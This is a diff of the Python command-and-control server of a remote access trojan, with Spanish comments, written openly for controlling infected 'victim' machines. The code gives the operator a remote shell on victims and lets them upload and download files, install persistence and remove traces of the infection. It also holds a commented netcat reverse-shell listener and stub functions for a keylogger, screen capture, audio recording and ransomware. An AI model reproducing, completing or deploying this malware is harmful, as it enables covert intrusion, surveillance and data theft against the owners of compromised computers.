@@ -1,16 +1,20 @@
 
-# CONFIGURACIONES PARA EL SERVIDOR ALIENIGENA
+# NUCLEO DE TODO INVASORES >:)
+# CREADO POR KIRARI
 
+
+# MODULOS DEL SISTEMA
 import os
 import sys
 import time
 import socket
 import pygame	
 
-import utilidades.creador_ayuda as ayuda
-
 from tabulate import tabulate
 from threading import Thread
+
+# MODULOS CREADOS
+import utilidades.creador_ayuda as ayuda
 from utilidades.banners import *
 from utilidades.cadenas import chain_alien
 
@@ -67,7 +71,6 @@ def desplegar_ayuda(COMANDOS,tipo):
 		ayuda.comandos_basicos('secundario')
 
 	elif tipo=="manipular":
-		ayuda.comandos(COMANDOS,'Comandos para manipulacion de victima')
 		ayuda.comandos_basicos('secundario')
 
 	elif tipo=="cmd":
@@ -131,10 +134,31 @@ class Server(Thread):
 
 	# --------- RECIBIR MENSAJES ---------
 
-	def recibir(self,server):
-		raw_msg = server.recv(4096)
+	def recibir(self,server,chunk=4096):
+		raw_msg = server.recv(chunk)
 		msg = (raw_msg).decode('utf-8')
 		return msg
+
+
+	def recibir_todo(self,server):
+	
+		longitud = int(self.recibir(server))
+
+		data = []
+
+		while(True):
+			datos = self.recibir(server)
+			data.append(datos)
+			if (len(data)==longitud):
+				break
+
+		print('\n')
+		for _ in data:
+			print(_.rstrip('\n'))
+
+		print('\n')
+
+		return True
 
 
 	# --------- OBTENER INFORMACION --------- 
@@ -272,7 +296,14 @@ class Server(Thread):
 
 class Control():
 
-	def run_cmd(servidor,client):
+	def __init__(self,servidor,client):
+		self.servidor = servidor
+		self.objetivo = servidor.terricolas[client][0]
+		self.hostname = servidor.terricolas[client][2]
+
+	# MODULOS EXTRAS
+
+	def run_cmd(self):
 		
 		COMANDOS = {
 
@@ -280,22 +311,22 @@ class Control():
 
 		}
 
-		servidor.enviar(servidor.terricolas[client][0],"cmd")
+		self.servidor.enviar(self.objetivo,"cmd")
 
-		sesion = input(" (\033[0;31m" + servidor.terricolas[client][2] + "\033[0;39m)> ")
+		sesion = input(" (\033[0;31m" + self.hostname + "\033[0;39m)> ")
 
 		while(True):
 			try:
 
 				if(sesion!=""):
 					if("cd " in sesion):
-						servidor.enviar(servidor.terricolas[client][0],sesion)
-						location = servidor.recibir(servidor.terricolas[client][0])
+						self.servidor.enviar(self.objetivo,sesion)
+						location = self.servidor.recibir(self.objetivo)
 						print(location)
 
 					elif (sesion=="detener") or (sesion=="exit"):
-						servidor.enviar(servidor.terricolas[client][0],sesion)
-						t = servidor.recibir(servidor.terricolas[client][0])
+						self.servidor.enviar(self.objetivo,sesion)
+						t = self.servidor.recibir(self.objetivo)
 						print(t)
 						break
 
@@ -303,22 +334,11 @@ class Control():
 						desplegar_ayuda(COMANDOS,'cmd')
 
 					else:
-						servidor.enviar(servidor.terricolas[client][0],sesion)
-						longitud = int(servidor.recibir(servidor.terricolas[client][0]))
-
-						data = []
-
-						while(True):
-							datos = servidor.recibir(servidor.terricolas[client][0])
-							data.append(datos)
-							if (len(data)==longitud):
-								break
-		
-						for _ in data:
-							print(_.rstrip('\n'))
+						self.servidor.enviar(self.objetivo,sesion)
+						self.servidor.recibir_todo(self.objetivo)
 
 
-				sesion = input(" (\033[0;31m" + servidor.terricolas[client][2] + "\033[0;39m)> ")
+				sesion = input(" (\033[0;31m" + self.hostname + "\033[0;39m)> ")
 
 			except Exception as e:
 				print(" Error de comunicacion con vicitma: ",e)
@@ -327,26 +347,63 @@ class Control():
 		return
 
 
-	def subir_archivos(servidor,client,origen,destino):
+	def netcat(self):
+		#servidor.enviar(servidor.terricolas[client][0],"netcat")
+		#os.system('xterm -fg white -bg black -geometry 93x31+0+100 -title "Victima Netcat" -e nc -lp 9001 &')
+		return (" Modulo en desarrollo")
+
+	def persistencia(self):
+
+		self.servidor.enviar(self.objetivo,"persistencia")
+		msg = self.servidor.recibir(self.objetivo)
+		print (msg)
+		return
+
+
+	def autoremoverse(self):
+
+		self.servidor.enviar(self.objetivo,"autoremover")
+		msg = self.servidor.recibir(self.objetivo)
+		print (msg)
+		return
+
+
+	def keylogger(self):
+		return
+
+
+	def screenshot(self):
+		return
+
+
+	def grabarAudio(self):
+		return
+
+
+	def ransomware(self):
+		return
+
+
+	def subir_archivos(self,origen,destino):
 
 		# Envia modo de uso y recibe el 'ok'
-		servidor.enviar(servidor.terricolas[client][0],"subir")
-		servidor.recibir(servidor.terricolas[client][0])
+		self.servidor.enviar(self.objetivo,"subir")
+		self.servidor.recibir(self.objetivo)
 
 		# Envia el destino donde se va a guardar el archivo
-		servidor.enviar(servidor.terricolas[client][0],destino)
-		servidor.recibir(servidor.terricolas[client][0])
+		self.servidor.enviar(self.objetivo,destino)
+		self.servidor.recibir(self.objetivo)
 		time.sleep(0.1)
 
-		servidor.enviar(servidor.terricolas[client][0],str(os.path.getsize(origen)))
-		servidor.recibir(servidor.terricolas[client][0])
+		self.servidor.enviar(self.objetivo,str(os.path.getsize(origen)))
+		self.servidor.recibir(self.objetivo)
 		time.sleep(1)
 
 		# Se prepara para el envio de datos del archivo
 		with open(origen, "rb") as archivo_origen:
 				contenido = archivo_origen.read(1024)
 				while contenido:
-					servidor.terricolas[client][0].sendall(contenido)
+					self.objetivo.sendall(contenido)
 					contenido = archivo_origen.read(1024)
 
 		print(" El archivo se subio correctamente.")    
@@ -354,19 +411,19 @@ class Control():
 		return
 
 
-	def descargar_archivos(servidor,client,origen,destino):
+	def descargar_archivos(self,origen,destino):
 
 		# Envia modo de uso y recibe el 'ok'
-		servidor.enviar(servidor.terricolas[client][0],"descargar")
-		servidor.recibir(servidor.terricolas[client][0])
+		self.servidor.enviar(self.objetivo,"descargar")
+		self.servidor.recibir(self.objetivo)
 
 
 		# Envia ruta a descargar
-		servidor.enviar(servidor.terricolas[client][0],origen)
+		self.servidor.enviar(self.objetivo,origen)
 		time.sleep(0.1)
 
-		size = int(servidor.recibir(servidor.terricolas[client][0]))
-		servidor.enviar(servidor.terricolas[client][0],"ok")
+		size = int(self.servidor.recibir(self.objetivo))
+		self.servidor.enviar(self.objetivo,"ok")
 
 		#print(size)
 
@@ -375,7 +432,7 @@ class Control():
 			#contenido = self.client.recv(1024)
 			#print(os.path.getsize(destino))
 			while (size>0):
-				contenido = servidor.terricolas[client][0].recv(1024)
+				contenido = self.objetivo.recv(1024)
 				archivo_destino.write(contenido)
 				size-=len(contenido)
 				#print(size)
@@ -386,50 +443,24 @@ class Control():
 		return
 
 
-	def ls(servidor,client):
+	# MODULOS PARA COMANDOS EXCEPCIONALES DEL SISTEMA VICTIMA
+
+	def ls(self):
 		return
 
-	def pwd(servidor,client):
+	def pwd(self):
 		return
 
-	def cd(servidor,client):
-		return
-
-
-	def netcat(servidor,client):
-		#servidor.enviar(servidor.terricolas[client][0],"netcat")
-		#os.system('xterm -fg white -bg black -geometry 93x31+0+100 -title "Victima Netcat" -e nc -lp 9001 &')
-		return (" Modulo en desarrollo")
-
-	def persistencia(servidor,client):
-
-		servidor.enviar(servidor.terricolas[client][0],"persistencia")
-		msg = servidor.recibir(servidor.terricolas[client][0])
-		print (msg)
+	def cd(self):
 		return
 
 
-	def autoremoverse(servidor,client):
 
-		servidor.enviar(servidor.terricolas[client][0],"autoremover")
-		msg = servidor.recibir(servidor.terricolas[client][0])
-		print (msg)
-		return
+	# MODULOS PARA COMANDOS RED
 
-
-	def keylogger(servidor,client):
-		return
-
-
-	def screenshot(servidor,client):
-		return
-
-
-	def grabarAudio(servidor,client):
-		return
-
-
-	def ransomware(servidor,client):
+	def ifconfig(self):
+		self.servidor.enviar(self.objetivo,"ifconfig")
+		self.servidor.recibir_todo(self.objetivo)
 		return
 
 
@@ -438,48 +469,93 @@ class Control():
 
 def manipular(servidor,cliente):
 
-	COMANDOS = {
+	COMANDOS_EXTRA = {
 
 	"cmd" : ["shell","Ejecutar shell"],
 	"netcat" : ["netcat","Utiliza netcat para obtener un shell inversa"],
-	"subir" : ["upload","Subir archivo a equipo remoto"],
-	"descargar" : ["download","Descargar archivo de equipo remoto"],
 	"persistencia" : ["persistence","Implantar bicho en el cerebro victima"],
-	"autoremover" : ["autoremove","Elimina rastro del bicho en el sisetma infectado"],
+	"autoremover" : ["autoremove","Elimina rastro del bicho en el sisetma infectado"]
 
 	}
 
+	COMANDOS_SISTEMA = {
+
+	"ls" : ["ls","Listar directorios de la carpeta actual"],
+	"pwd" : ["pwd","Ver posicion actual"],
+	"cd <directorio>" : ["cd","Cambiar de directorio"]
+
+	}
+
+
+	COMANDOS_RED = {
+
+	"ifconfig" : ["upload","Ver configuraciones de red de la victima"]
+
+	}
+
+
+	COMANDOS_ARCHIVOS = {
+
+	"subir" : ["upload","Subir archivo a equipo remoto"],
+	"descargar" : ["download","Descargar archivo de equipo remoto"]
+
+	}
+
+
+
 	encabezados('manipular')
+
+	control = Control(servidor,cliente)
+	
 	victima = (input(" \033[0;39mInvasores (\033[0;33mLaboratorio/" + servidor.terricolas[cliente][2] + "\033[0;39m) --> \033[0;39m").lower()).replace(' ', '')
 
 	while (victima!="volver"):
 
+		# MODULOS EXTRA
+
 		if (victima=="cmd"):
-			Control.run_cmd(servidor,cliente)
+			control.run_cmd()
 			encabezados('manipular')
+		
+		elif (victima=="netcat"):
+			os.system('clear')
+			banner_manipular()
+			control.netcat()
+			encabezados('manipular')
+
+		elif (victima=="persistencia"):
+			control.persistencia()
+
+		# MODULOS ARCHIVOS
 
 		elif (victima=="subir"):
 			origen = input(' Ruta archivo atacante: ')
 			destino = input(' Ruta archivo victima: ')
-			Control.subir_archivos(servidor,cliente,origen,destino)
+			control.subir_archivos(origen,destino)
 
 		elif (victima=="descargar"):
 			origen = input(' Ruta archivo victima: ')
 			destino = input(' Ruta archivo atacante: ')
-			Control.descargar_archivos(servidor,cliente,origen,destino)
+			control.descargar_archivos(origen,destino)
 
-		elif (victima=="netcat"):
-			os.system('clear')
-			banner_manipular()
-			Control.netcat(servidor,cliente)
-			encabezados('manipular')
+		# MODULOS DE RED
 
-		elif (victima=="persistencia"):
-			Control.persistencia(servidor,cliente)
-			#encabezados('manipular')
+		elif (victima=="ifconfig"):
+			control.ifconfig()
+
+
+		# MODULOS BASICOS
 
 		elif (victima=="ayuda"):
-			desplegar_ayuda(COMANDOS,'manipular')
+			ayuda.comandos(COMANDOS_EXTRA,"Comandos extra")
+			ayuda.comandos(COMANDOS_ARCHIVOS,"Comandos de archivos")
+			ayuda.comandos(COMANDOS_RED,"Comandos de red")
+			ayuda.comandos(COMANDOS_SISTEMA,"Comandos del sistema")
+			ayuda.comandos_basicos("secundario")
+
+
+		elif (victima=="limpiar"):
+			encabezados('manipular')
 
 		elif (victima==""):
 			pass
@@ -559,6 +635,9 @@ def laboratorio(servidor):
 		elif (prompt_laboratorio=="ayuda"):
 			desplegar_ayuda(COMANDOS,'laboratorio')
 
+		elif (prompt_laboratorio=="limpiar"):
+			encabezados('laboratorio')
+
 		elif (prompt_laboratorio==""):
 			pass
 
@@ -618,6 +697,9 @@ def abducciones_menu(servidor):
 
 		elif (selector=='ayuda'):
 			desplegar_ayuda(COMANDOS,"abducciones")
+
+		elif (selector=='limpiar'):
+			encabezados('abduccion')
 
 		elif(selector == ''):
 			pass
